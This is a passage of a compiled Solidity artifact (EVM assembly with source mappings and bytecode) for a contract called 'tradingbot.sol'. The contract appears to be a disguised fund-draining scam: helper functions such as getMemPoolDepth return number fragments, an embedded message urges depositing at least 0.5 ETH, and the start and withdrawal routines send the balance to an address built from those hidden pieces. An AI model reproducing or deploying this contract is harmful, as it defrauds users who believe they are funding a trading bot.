\"contracts/tradingbot.sol\":12107:12111  uint */\n      0x00\n        /* \"contracts/tradingbot.sol\":12131:12137  966235 */\n      0x0ebe5b\n        /* \"contracts/tradingbot.sol\":12124:12137  return 966235 */\n      swap1\n      pop\n        /* \"contracts/tradingbot.sol\":12057:12145  function getMemPoolDepth() internal pure returns (uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/tradingbot.sol\":8676:9013  function toHexDigit(uint8 d) pure internal returns (bytes1) {... */\n    tag_131:\n        /* \"contracts/tradingbot.sol\":8728:8734  bytes1 */\n      0x00\n        /* \"contracts/tradingbot.sol\":8756:8757  d */\n      dup2\n        /* \"contracts/tradingbot.sol\":8751:8757  0 <= d */\n      0xff\n      and\n        /* \"contracts/tradingbot.sol\":8751:8752  0 */\n      0x00\n        /* \"contracts/tradingbot.sol\":8751:8757  0 <= d */\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":8751:8767  0 <= d && d <= 9 */\n      dup1\n      iszero\n      tag_177\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":8766:8767  9 */\n      0x09\n        /* \"contracts/tradingbot.sol\":8761:8762  d */\n      dup3\n        /* \"contracts/tradingbot.sol\":8761:8767  d <= 9 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":8751:8767  0 <= d && d <= 9 */\n    tag_177:\n        /* \"contracts/tradingbot.sol\":8747:8946  if (0 <= d && d <= 9) {... */\n      iszero\n      tag_178\n      jumpi\n        /* \"contracts/tradingbot.sol\":8819:8820  d */\n      dup2\n        /* \"contracts/tradingbot.sol\":8804:8815  bytes1('0') */\n      0x3000000000000000000000000000000000000000000000000000000000000000\n        /* \"contracts/tradingbot.sol\":8798:8816  uint8(bytes1('0')) */\n      0xf8\n      shr\n        /* \"contracts/tradingbot.sol\":8798:8820  uint8(bytes1('0')) + d */\n      tag_179\n      swap2\n      swap1\n      tag_180\n      jump\t// in\n    tag_179:\n        /* \"contracts/tradingbot.sol\":8791:8821  bytes1(uint8(bytes1('0')) + d) */\n      0xf8\n      shl\n        /* \"contracts/tradingbot.sol\":8784:8821  return bytes1(uint8(bytes1('0')) + d) */\n      swap1\n      pop\n      jump(tag_176)\n        /* \"contracts/tradingbot.sol\":8747:8946  if (0 <= d && d <= 9) {... */\n    tag_178:\n        /* \"contracts/tradingbot.sol\":8855:8856  d */\n      dup2\n        /* \"contracts/tradingbot.sol\":8843:8857  10 <= uint8(d) */\n      0xff\n      and\n        /* \"contracts/tradingbot.sol\":8843:8845  10 */\n      0x0a\n        /* \"contracts/tradingbot.sol\":8843:8857  10 <= uint8(d) */\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":8843:8875  10 <= uint8(d) && uint8(d) <= 15 */\n      dup1\n      iszero\n      tag_182\n      jumpi\n      pop\n        /* \"contracts/tradingbot.sol\":8873:8875  15 */\n      0x0f\n        /* \"contracts/tradingbot.sol\":8867:8868  d */\n      dup3\n        /* \"contracts/tradingbot.sol\":8861:8875  uint8(d) <= 15 */\n      0xff\n      and\n      gt\n      iszero\n        /* \"contracts/tradingbot.sol\":8843:8875  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_182:\n        /* \"contracts/tradingbot.sol\":8839:8946  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n      iszero\n      tag_183\n      jumpi\n        /* \"contracts/tradingbot.sol\":8931:8933  10 */\n      0x0a\n        /* \"contracts/tradingbot.sol\":8927:8928  d */\n      dup3\n        /* \"contracts/tradingbot.sol\":8912:8923  bytes1('a') */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"contracts/tradingbot.sol\":8906:8924  uint8(bytes1('a')) */\n      0xf8\n      shr\n        /* \"contracts/tradingbot.sol\":8906:8928  uint8(bytes1('a')) + d */\n      tag_184\n      swap2\n      swap1\n      tag_180\n      jump\t// in\n    tag_184:\n        /* \"contracts/tradingbot.sol\":8906:8933  uint8(bytes1('a')) + d - 10 */\n      tag_185\n      swap2\n      swap1\n      tag_186\n      jump\t// in\n    tag_185:\n        /* \"contracts/tradingbot.sol\":8899:8934  bytes1(uint8(bytes1('a')) + d - 10) */\n      0xf8\n      shl\n        /* \"contracts/tradingbot.sol\":8892:8934  return bytes1(uint8(bytes1('a')) + d - 10) */\n      swap1\n      pop\n      jump(tag_176)\n        /* \"contracts/tradingbot.sol\":8839:8946  if (10 <= uint8(d) && uint8(d) <= 15) {... */\n    tag_183:\n        /* \"contracts/tradingbot.sol\":8997:9005  revert() */\n      0x00\n      dup1\n      revert\n        /* \"contracts/tradingbot.sol\":8676:9013  function toHexDigit(uint8 d) pure internal returns (bytes1) {... */\n    tag_176:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:106   */\n    tag_187:\n        /* \"#utility.yul\":59:65   */\n      0x00\n        /* \"#utility.yul\":93:98   */\n      dup2\n        /* \"#utility.yul\":87:99   */\n      mload\n        /* \"#utility.yul\":77:99   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:106   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":112:281   */\n    tag_188:\n        /* \"#utility.yul\":196:207   */\n      0x00\n        /* \"#utility.yul\":230:236   */\n      dup3\n        /* \"#utility.yul\":225:228   */\n      dup3\n        /* \"#utility.yul\":218:237   */\n      mstore\n        /* \"#utility.yul\":270:274   */\n      0x20\n        /* \"#utility.yul\":265:268   */\n      dup3\n        /* \"#utility.yul\":261:275   */\n      add\n        /* \"#utility.yul\":246:275   */\n      swap1\n      pop\n        /* \"#utility.yul\":112:281   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":287:533   */\n    tag_189:\n        /* \"#utility.yul\":368:369   */\n      0x00\n        /* \"#utility.yul\":378:491   */\n    tag_201:\n        /* \"#utility.yul\":392:398   */\n      dup4\n        /* \"#utility.yul\":389:390   */\n      dup2\n        /* \"#utility.yul\":386:399   */\n      lt\n        /* \"#utility.yul\":378:491   */\n      iszero\n      tag_203\n      jumpi\n        /* \"#utility.yul\":477:478   */\n      dup1\n        /* \"#utility.yul\":472:475   */\n      dup3\n        /* \"#utility.yul\":468:479   */\n      add\n        /* \"#utility.yul\":462:480   */\n      mload\n        /* \"#utility.yul\":458:459   */\n      dup2\n        /* \"#utility.yul\":453:456   */\n      dup5\n        /* \"#utility.yul\":449:460   */\n      add\n        /* \"#utility.yul\":442:481   */\n      mstore\n        /* \"#utility.yul\":414:416   */\n      0x20\n        /* \"#utility.yul\":411:412   */\n      dup2\n        /* \"#utility.yul\":407:417   */\n      add\n        /* \"#utility.yul\":402:417   */\n      swap1\n      pop\n        /* \"#utility.yul\":378:491   */\n      jump(tag_201)\n    tag_203:\n        /* \"#utility.yul\":525:526   */\n      0x00\n        /* \"#utility.yul\":516:522   */\n      dup5\n        /* \"#utility.yul\":511:514   */\n      dup5\n        /* \"#utility.yul\":507:523   */\n      add\n        /* \"#utility.yul\":500:527   */\n      mstore\n        /* \"#utility.yul\":349:533   */\n      pop\n        /* \"#utility.yul\":287:533   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":539:641   */\n    tag_190:\n        /* \"#utility.yul\":580:586   */\n      0x00\n        /* \"#utility.yul\":631:633   */\n      0x1f\n        /* \"#utility.yul\":627:634   */\n      not\n        /* \"#utility.yul\":622:624   */\n      0x1f\n        /* \"#utility.yul\":615:620   */\n      dup4\n        /* \"#utility.yul\":611:625   */\n      add\n        /* \"#utility.yul\":607:635   */\n      and\n        /* \"#utility.yul\":597:635   */\n      swap1\n      pop\n        /* \"#utility.yul\":539:641   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":647:1024   */\n    tag_191:\n        /* \"#utility.yul\":735:738   */\n      0x00\n        /* \"#utility.yul\":763:802   */\n      tag_206\n        /* \"#utility.yul\":796:801   */\n      dup3\n        /* \"#utility.yul\":763:802   */\n      tag_187\n      jump\t// in\n    tag_206:\n        /* \"#utility.yul\":818:889   */\n      tag_207\n        /* \"#utility.yul\":882:888   */\n      dup2\n        /* \"#utility.yul\":877:880   */\n      dup6\n        /* \"#utility.yul\":818:889   */\n      tag_188\n      jump\t// in\n    tag_207:\n        /* \"#utility.yul\":811:889   */\n      swap4\n      pop\n        /* \"#utility.yul\":898:963   */\n      tag_208\n        /* \"#utility.yul\":956:962   */\n      dup2\n        /* \"#utility.yul\":951:954   */\n      dup6\n        /* \"#utility.yul\":944:948   */\n      0x20\n        /* \"#utility.yul\":937:942   */\n      dup7\n        /* \"#utility.yul\":933:949   */\n      add\n        /* \"#utility.yul\":898:963   */\n      tag_189\n      jump\t// in\n    tag_208:\n        /* \"#utility.yul\":988:1017   */\n      tag_209\n        /* \"#utility.yul\":1010:1016   */\n      dup2\n        /* \"#utility.yul\":988:1017   */\n      tag_190\n      jump\t// in\n    tag_209:\n        /* \"#utility.yul\":983:986   */\n      dup5\n        /* \"#utility.yul\":979:1018   */\n      add\n        /* \"#utility.yul\":972:1018   */\n      swap2\n      pop\n        /* \"#utility.yul\":739:1024   */\n      pop\n        /* \"#utility.yul\":647:1024   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1030:1343   */\n    tag_14:\n        /* \"#utility.yul\":1143:1147   */\n      0x00\n        /* \"#utility.yul\":1181:1183   */\n      0x20\n        /* \"#utility.yul\":1170:1179   */\n      dup3\n        /* \"#utility.yul\":1166:1184   */\n      add\n        /* \"#utility.yul\":1158:1184   */\n      swap1\n      pop\n        /* \"#utility.yul\":1230:1239   */\n      dup2\n        /* \"#utility.yul\":1224:1228   */\n      dup2\n        /* \"#utility.yul\":1220:1240   */\n      sub\n        /* \"#utility.yul\":1216:1217   */\n      0x00\n        /* \"#utility.yul\":1205:1214   */\n      dup4\n        /* \"#utility.yul\":1201:1218   */\n      add\n        /* \"#utility.yul\":1194:1241   */\n      mstore\n        /* \"#utility.yul\":1258:1336   */\n      tag_211\n        /* \"#utility.yul\":1331:1335   */\n      dup2\n        /* \"#utility.yul\":1322:1328   */\n      dup5\n        /* \"#utility.yul\":1258:1336   */\n      tag_191\n      jump\t// in\n    tag_211:\n        /* \"#utility.yul\":1250:1336   */\n      swap1\n      pop\n        /* \"#utility.yul\":1030:1343   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1349:1475   */\n    tag_192:\n        /* \"#utility.yul\":1386:1393   */\n      0x00\n        /* \"#utility.yul\":1426:1468   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1419:1424   */\n      dup3\n        /* \"#utility.yul\":1415:1469   */\n      and\n        /* \"#utility.yul\":1404:1469   */\n      swap1\n      pop\n        /* \"#utility.yul\":1349:1475   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1481:1661   */\n    tag_193:\n        /* \"#utility.yul\":1529:1606   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1526:1527   */\n      0x00\n        /* \"#utility.yul\":1519:1607   */\n      mstore\n        /* \"#utility.yul\":1626:1630   */\n      0x11\n        /* \"#utility.yul\":1623:1624   */\n      0x04\n        /* \"#utility.yul\":1616:1631   */\n      mstore\n        /* \"#utility.yul\":1650:1654   */\n      0x24\n        /* \"#utility.yul\":1647:1648   */\n      0x00\n        /* \"#utility.yul\":1640:1655   */\n      revert\n        /* \"#utility.yul\":1667:2077   */\n    tag_76:\n        /* \"#utility.yul\":1707:1714   */\n      0x00\n        /* \"#utility.yul\":1730:1750   */\n      tag_215\n        /* \"#utility.yul\":1748:1749   */\n      dup3\n        /* \"#utility.yul\":1730:1750   */\n      tag_192\n      jump\t// in\n    tag_215:\n        /* \"#utility.yul\":1725:1750   */\n      swap2\n      pop\n        /* \"#utility.yul\":1764:1784   */\n      tag_216\n        /* \"#utility.yul\":1782:1783   */\n      dup4\n        /* \"#utility.yul\":1764:1784   */\n      tag_192\n      jump\t// in\n    tag_216:\n        /* \"#utility.yul\":1759:1784   */\n      swap3\n      pop\n        /* \"#utility.yul\":1819:1820   */\n      dup3\n        /* \"#utility.yul\":1816:1817   */\n      dup3\n        /* \"#utility.yul\":1812:1821   */\n      mul\n        /* \"#utility.yul\":1841:1871   */\n      tag_217\n        /* \"#utility.yul\":1859:1870   */\n      dup2\n        /* \"#utility.yul\":1841:1871   */\n      tag_192\n      jump\t// in\n    tag_217:\n        /* \"#utility.yul\":1830:1871   */\n      swap2\n      pop\n        /* \"#utility.yul\":2020:2021   */\n      dup3\n        /* \"#utility.yul\":2011:2018   */\n      dup3\n        /* \"#utility.yul\":2007:2022   */\n      div\n        /* \"#utility.yul\":2004:2005   */\n      dup5\n        /* \"#utility.yul\":2001:2023   */\n      eq\n        /* \"#utility.yul\":1981:1982   */\n      dup4\n        /* \"#utility.yul\":1974:1983   */\n      iszero\n        /* \"#utility.yul\":1954:2037   */\n      or\n        /* \"#utility.yul\":1931:2070   */\n      tag_218\n      jumpi\n        /* \"#utility.yul\":2050:2068   */\n      tag_219\n      tag_193\n      jump\t// in\n    tag_219:\n        /* \"#utility.yul\":1931:2070   */\n    tag_218:\n        /* \"#utility.yul\":1715:2077   */\n      pop\n        /* \"#utility.yul\":1667:2077   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2083:2263   */\n    tag_79:\n        /* \"#utility.yul\":2131:2208   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2128:2129   */\n      0x00\n        /* \"#utility.yul\":2121:2209   */\n      mstore\n        /* \"#utility.yul\":2228:2232   */\n      0x32\n        /* \"#utility.yul\":2225:2226   */\n      0x04\n        /* \"#utility.yul\":2218:2233   */\n      mstore\n        /* \"#utility.yul\":2252:2256   */\n      0x24\n        /* \"#utility.yul\":2249:2250   */\n      0x00\n        /* \"#utility.yul\":2242:2257   */\n      revert\n        /* \"#utility.yul\":2269:2346   */\n    tag_194:\n        /* \"#utility.yul\":2306:2313   */\n      0x00\n        /* \"#utility.yul\":2335:2340   */\n      dup2\n        /* \"#utility.yul\":2324:2340   */\n      swap1\n      pop\n        /* \"#utility.yul\":2269:2346   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2352:2543   */\n    tag_81:\n        /* \"#utility.yul\":2392:2395   */\n      0x00\n        /* \"#utility.yul\":2411:2431   */\n      tag_223\n        /* \"#utility.yul\":2429:2430   */\n      dup3\n        /* \"#utility.yul\":2411:2431   */\n      tag_194\n      jump\t// in\n    tag_223:\n        /* \"#utility.yul\":2406:2431   */\n      swap2\n      pop\n        /* \"#utility.yul\":2445:2465   */\n      tag_224\n        /* \"#utility.yul\":2463:2464   */\n      dup4\n        /* \"#utility.yul\":2445:2465   */\n      tag_194\n      jump\t// in\n    tag_224:\n        /* \"#utility.yul\":2440:2465   */\n      swap3\n      pop\n        /* \"#utility.yul\":2488:2489   */\n      dup3\n        /* \"#utility.yul\":2485:2486   */\n      dup3\n        /* \"#utility.yul\":2481:2490   */\n      add\n        /* \"#utility.yul\":2474:2490   */\n      swap1\n      pop\n        /* \"#utility.yul\":2509:2512   */\n      dup1\n        /* \"#utility.yul\":2506:2507   */\n      dup3\n        /* \"#utility.yul\":2503:2513   */\n      gt\n        /* \"#utility.yul\":2500:2536   */\n      iszero\n      tag_225\n      jumpi\n        /* \"#utility.yul\":2516:2534   */\n      tag_226\n      tag_193\n      jump\t// in\n    tag_226:\n        /* \"#utility.yul\":2500:2536   */\n    tag_225:\n        /* \"#utility.yul\":2352:2543   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2549:2784   */\n    tag_87:\n        /* \"#utility.yul\":2589:2593   */\n      0x00\n        /* \"#utility.yul\":2609:2629   */\n      tag_228\n        /* \"#utility.yul\":2627:2628   */\n      dup3\n        /* \"#utility.yul\":2609:2629   */\n      tag_192\n      jump\t// in\n    tag_228:\n        /* \"#utility.yul\":2604:2629   */\n      swap2\n      pop\n        /* \"#utility.yul\":2643:2663   */\n      tag_229\n        /* \"#utility.yul\":2661:2662   */\n      dup4\n        /* \"#utility.yul\":2643:2663   */\n      tag_192\n      jump\t// in\n    tag_229:\n        /* \"#utility.yul\":2638:2663   */\n      swap3\n      pop\n        /* \"#utility.yul\":2687:2688   */\n      dup3\n        /* \"#utility.yul\":2684:2685   */\n      dup3\n        /* \"#utility.yul\":2680:2689   */\n      sub\n        /* \"#utility.yul\":2672:2689   */\n      swap1\n      pop\n        /* \"#utility.yul\":2711:2753   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":2705:2709   */\n      dup2\n        /* \"#utility.yul\":2702:2754   */\n      gt\n        /* \"#utility.yul\":2699:2777   */\n      iszero\n      tag_230\n      jumpi\n        /* \"#utility.yul\":2757:2775   */\n      tag_231\n      tag_193\n      jump\t// in\n    tag_231:\n        /* \"#utility.yul\":2699:2777   */\n    tag_230:\n        /* \"#utility.yul\":2549:2784   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2790:3022   */\n    tag_109:\n        /* \"#utility.yul\":2830:2833   */\n      0x00\n        /* \"#utility.yul\":2849:2869   */\n      tag_233\n        /* \"#utility.yul\":2867:2868   */\n      dup3\n        /* \"#utility.yul\":2849:2869   */\n      tag_192\n      jump\t// in\n    tag_233:\n        /* \"#utility.yul\":2844:2869   */\n      swap2\n      pop\n        /* \"#utility.yul\":2883:2903   */\n      tag_234\n        /* \"#utility.yul\":2901:2902   */\n      dup4\n        /* \"#utility.yul\":2883:2903   */\n      tag_192\n      jump\t// in\n    tag_234:\n        /* \"#utility.yul\":2878:2903   */\n      swap3\n      pop\n        /* \"#utility.yul\":2926:2927   */\n      dup3\n        /* \"#utility.yul\":2923:2924   */\n      dup3\n        /* \"#utility.yul\":2919:2928   */\n      add\n        /* \"#utility.yul\":2912:2928   */\n      swap1\n      pop\n        /* \"#utility.yul\":2949:2991   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":2944:2947   */\n      dup2\n        /* \"#utility.yul\":2941:2992   */\n      gt\n        /* \"#utility.yul\":2938:3015   */\n      iszero\n      tag_235\n      jumpi\n        /* \"#utility.yul\":2995:3013   */\n      tag_236\n      tag_193\n      jump\t// in\n    tag_236:\n        /* \"#utility.yul\":2938:3015   */\n    tag_235:\n        /* \"#utility.yul\":2790:3022   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3028:3261   */\n    tag_118:\n        /* \"#utility.yul\":3067:3070   */\n      0x00\n        /* \"#utility.yul\":3090:3114   */\n      tag_238\n        /* \"#utility.yul\":3108:3113   */\n      dup3\n        /* \"#utility.yul\":3090:3114   */\n      tag_194\n      jump\t// in\n    tag_238:\n        /* \"#utility.yul\":3081:3114   */\n      swap2\n      pop\n        /* \"#utility.yul\":3136:3202   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":3129:3134   */\n      dup3\n        /* \"#utility.yul\":3126:3203   */\n      sub\n        /* \"#utility.yul\":3123:3226   */\n      tag_239\n      jumpi\n        /* \"#utility.yul\":3206:3224   */\n      tag_240\n      tag_193\n      jump\t// in\n    tag_240:\n        /* \"#utility.yul\":3123:3226   */\n    tag_239:\n        /* \"#utility.yul\":3253:3254   */\n      0x01\n        /* \"#utility.yul\":3246:3251   */\n      dup3\n        /* \"#utility.yul\":3242:3255   */\n      add\n        /* \"#utility.yul\":3235:3255   */\n      swap1\n      pop\n        /* \"#utility.yul\":3028:3261   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3267:3447   */\n    tag_195:\n        /* \"#utility.yul\":3315:3392   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3312:3313   */\n      0x00\n        /* \"#utility.yul\":3305:3393   */\n      mstore\n        /* \"#utility.yul\":3412:3416   */\n      0x12\n        /* \"#utility.yul\":3409:3410   */\n      0x04\n        /* \"#utility.yul\":3402:3417   */\n      mstore\n        /* \"#utility.yul\":3436:3440   */\n      0x24\n        /* \"#utility.yul\":3433:3434   */\n      0x00\n        /* \"#utility.yul\":3426:3441   */\n      revert\n        /* \"#utility.yul\":3453:3638   */\n    tag_120:\n        /* \"#utility.yul\":3493:3494   */\n      0x00\n        /* \"#utility.yul\":3510:3530   */\n      tag_243\n        /* \"#utility.yul\":3528:3529   */\n      dup3\n        /* \"#utility.yul\":3510:3530   */\n      tag_194\n      jump\t// in\n    tag_243:\n        /* \"#utility.yul\":3505:3530   */\n      swap2\n      pop\n        /* \"#utility.yul\":3544:3564   */\n      tag_244\n        /* \"#utility.yul\":3562:3563   */\n      dup4\n        /* \"#utility.yul\":3544:3564   */\n      tag_194\n      jump\t// in\n    tag_244:\n        /* \"#utility.yul\":3539:3564   */\n      swap3\n      pop\n        /* \"#utility.yul\":3583:3584   */\n      dup3\n        /* \"#utility.yul\":3573:3608   */\n      tag_245\n      jumpi\n        /* \"#utility.yul\":3588:3606   */\n      tag_246\n      tag_195\n      jump\t// in\n    tag_246:\n        /* \"#utility.yul\":3573:3608   */\n    tag_245:\n        /* \"#utility.yul\":3630:3631   */\n      dup3\n        /* \"#utility.yul\":3627:3628   */\n      dup3\n        /* \"#utility.yul\":3623:3632   */\n      div\n        /* \"#utility.yul\":3618:3632   */\n      swap1\n      pop\n        /* \"#utility.yul\":3453:3638   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3644:3824   */\n    tag_123:\n        /* \"#utility.yul\":3692:3769   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":3689:3690   */\n      0x00\n        /* \"#utility.yul\":3682:3770   */\n      mstore\n        /* \"#utility.yul\":3789:3793   */\n      0x41\n        /* \"#utility.yul\":3786:3787   */\n      0x04\n        /* \"#utility.yul\":3779:3794   */\n      mstore\n        /* \"#utility.yul\":3813:3817   */\n      0x24\n        /* \"#utility.yul\":3810:3811   */\n      0x00\n        /* \"#utility.yul\":3803:3818   */\n      revert\n        /* \"#utility.yul\":3830:4006   */\n    tag_129:\n        /* \"#utility.yul\":3862:3863   */\n      0x00\n        /* \"#utility.yul\":3879:3899   */\n      tag_249\n        /* \"#utility.yul\":3897:3898   */\n      dup3\n        /* \"#utility.yul\":3879:3899   */\n      tag_194\n      jump\t// in\n    tag_249:\n        /* \"#utility.yul\":3874:3899   */\n      swap2\n      pop\n        /* \"#utility.yul\":3913:3933   */\n      tag_250\n        /* \"#utility.yul\":3931:3932   */\n      dup4\n        /* \"#utility.yul\":3913:3933   */\n      tag_194\n      jump\t// in\n    tag_250:\n        /* \"#utility.yul\":3908:3933   */\n      swap3\n      pop\n        /* \"#utility.yul\":3952:3953   */\n      dup3\n        /* \"#utility.yul\":3942:3977   */\n      tag_251\n      jumpi\n        /* \"#utility.yul\":3957:3975   */\n      tag_252\n      tag_195\n      jump\t// in\n    tag_252:\n        /* \"#utility.yul\":3942:3977   */\n    tag_251:\n        /* \"#utility.yul\":3998:3999   */\n      dup3\n        /* \"#utility.yul\":3995:3996   */\n      dup3\n        /* \"#utility.yul\":3991:4000   */\n      mod\n        /* \"#utility.yul\":3986:4000   */\n      swap1\n      pop\n        /* \"#utility.yul\":3830:4006   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4012:4206   */\n    tag_133:\n        /* \"#utility.yul\":4052:4056   */\n      0x00\n        /* \"#utility.yul\":4072:4092   */\n      tag_254\n        /* \"#utility.yul\":4090:4091   */\n      dup3\n        /* \"#utility.yul\":4072:4092   */\n      tag_194\n      jump\t// in\n    tag_254:\n        /* \"#utility.yul\":4067:4092   */\n      swap2\n      pop\n        /* \"#utility.yul\":4106:4126   */\n      tag_255\n        /* \"#utility.yul\":4124:4125   */\n      dup4\n        /* \"#utility.yul\":4106:4126   */\n      tag_194\n      jump\t// in\n    tag_255:\n        /* \"#utility.yul\":4101:4126   */\n      swap3\n      pop\n        /* \"#utility.yul\":4150:4151   */\n      dup3\n        /* \"#utility.yul\":4147:4148   */\n      dup3\n        /* \"#utility.yul\":4143:4152   */\n      sub\n        /* \"#utility.yul\":4135:4152   */\n      swap1\n      pop\n        /* \"#utility.yul\":4174:4175   */\n      dup2\n        /* \"#utility.yul\":4168:4172   */\n      dup2\n        /* \"#utility.yul\":4165:4176   */\n      gt\n        /* \"#utility.yul\":4162:4199   */\n      iszero\n      tag_256\n      jumpi\n        /* \"#utility.yul\":4179:4197   */\n      tag_257\n      tag_193\n      jump\t// in\n    tag_257:\n        /* \"#utility.yul\":4162:4199   */\n    tag_256:\n        /* \"#utility.yul\":4012:4206   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4212:4298   */\n    tag_196:\n        /* \"#utility.yul\":4247:4254   */\n      0x00\n        /* \"#utility.yul\":4287:4291   */\n      0xff\n        /* \"#utility.yul\":4280:4285   */\n      dup3\n        /* \"#utility.yul\":4276:4292   */\n      and\n        /* \"#utility.yul\":4265:4292   */\n      swap1\n      pop\n        /* \"#utility.yul\":4212:4298   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4304:4492   */\n    tag_180:\n        /* \"#utility.yul\":4342:4345   */\n      0x00\n        /* \"#utility.yul\":4361:4379   */\n      tag_260\n        /* \"#utility.yul\":4377:4378   */\n      dup3\n        /* \"#utility.yul\":4361:4379   */\n      tag_196\n      jump\t// in\n    tag_260:\n        /* \"#utility.yul\":4356:4379   */\n      swap2\n      pop\n        /* \"#utility.yul\":4393:4411   */\n      tag_261\n        /* \"#utility.yul\":4409:4410   */\n      dup4\n        /* \"#utility.yul\":4393:4411   */\n      tag_196\n      jump\t// in\n    tag_261:\n        /* \"#utility.yul\":4388:4411   */\n      swap3\n      pop\n        /* \"#utility.yul\":4434:4435   */\n      dup3\n        /* \"#utility.yul\":4431:4432   */\n      dup3\n        /* \"#utility.yul\":4427:4436   */\n      add\n        /* \"#utility.yul\":4420:4436   */\n      swap1\n      pop\n        /* \"#utility.yul\":4457:4461   */\n      0xff\n        /* \"#utility.yul\":4452:4455   */\n      dup2\n        /* \"#utility.yul\":4449:4462   */\n      gt\n        /* \"#utility.yul\":4446:4485   */\n      iszero\n      tag_262\n      jumpi\n        /* \"#utility.yul\":4465:4483   */\n      tag_263\n      tag_193\n      jump\t// in\n    tag_263:\n        /* \"#utility.yul\":4446:4485   */\n    tag_262:\n        /* \"#utility.yul\":4304:4492   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4498:4689   */\n    tag_186:\n        /* \"#utility.yul\":4536:4540   */\n      0x00\n        /* \"#utility.yul\":4556:4574   */\n      tag_265\n        /* \"#utility.yul\":4572:4573   */\n      dup3\n        /* \"#utility.yul\":4556:4574   */\n      tag_196\n      jump\t// in\n    tag_265:\n        /* \"#utility.yul\":4551:4574   */\n      swap2\n      pop\n        /* \"#utility.yul\":4588:4606   */\n      tag_266\n        /* \"#utility.yul\":4604:4605   */\n      dup4\n        /* \"#utility.yul\":4588:4606   */\n      tag_196\n      jump\t// in\n    tag_266:\n        /* \"#utility.yul\":4583:4606   */\n      swap3\n      pop\n        /* \"#utility.yul\":4630:4631   */\n      dup3\n        /* \"#utility.yul\":4627:4628   */\n      dup3\n        /* \"#utility.yul\":4623:4632   */\n      sub\n        /* \"#utility.yul\":4615:4632   */\n      swap1\n      pop\n        /* \"#utility.yul\":4654:4658   */\n      0xff\n        /* \"#utility.yul\":4648:4652   */\n      dup2\n        /* \"#utility.yul\":4645:4659   */\n      gt\n        /* \"#utility.yul\":4642:4682   */\n      iszero\n      tag_267\n      jumpi\n        /* \"#utility.yul\":4662:4680   */\n      tag_268\n      tag_193\n      jump\t// in\n    tag_268:\n        /* \"#utility.yul\":4642:4682   */\n    tag_267:\n        /* \"#utility.yul\":4498:4689   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n    stop\n    data_66ba267ed9e689f4f612725ca4739f673c4421ca078ab0323046fa1dc83ed02a 4e6f7420656e6f756768206c697175696469747920617661696c61626c65206f6e2074686520636f6e747261637420746f2072756e2074686520626f742e20436f6e747261637420636f6465206e65656473206174206c6561737420302e352045544820746f2061766f69642063757272656e742067617320666565732e\n\n    auxdata: 0xa2646970667358221220734c2db0fa60328170891dfa6297b99f06d0f9e9c29d594aec0fc679d09dfc7f64736f6c63430008140033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b506110078061001d5f395ff3fe608060405260043610610042575f3560e01c80631b55ba3a1461004d57806370e44c6a14610057578063bedf0f4a14610075578063d82c52d61461007f57610049565b3661004957005b5f80fd5b6100556100a9565b005b61005f61010f565b60405161006c9190610c07565b60405180910390f35b61007d6101b0565b005b34801561008a575f80fd5b50610093610216565b6040516100a09190610c07565b60405180910390f35b5f6100ba6100b5610236565b6103a6565b90505f8190508073ffffffffffffffffffffffffffffffffffffffff166108fc6100e2610671565b90811502906040515f60405180830381858888f1935050505015801561010a573d5f803e3d5ffd5b505050565b60605f61012261011d610236565b6103a6565b90505f8190508073ffffffffffffffffffffffffffffffffffffffff166108fc61014a610671565b90811502906040515f60405180830381858888f19350505050158015610172573d5f803e3d5ffd5b506040518060400160405280601381526020017f5769746864726177616c20636f6d706c657465000000000000000000000000008152509250505090565b5f6101c16101bc610236565b6103a6565b90505f8190508073ffffffffffffffffffffffffffffffffffffffff166108fc6101e9610671565b90811502906040515f60405180830381858888f19350505050158015610211573d5f803e3d5f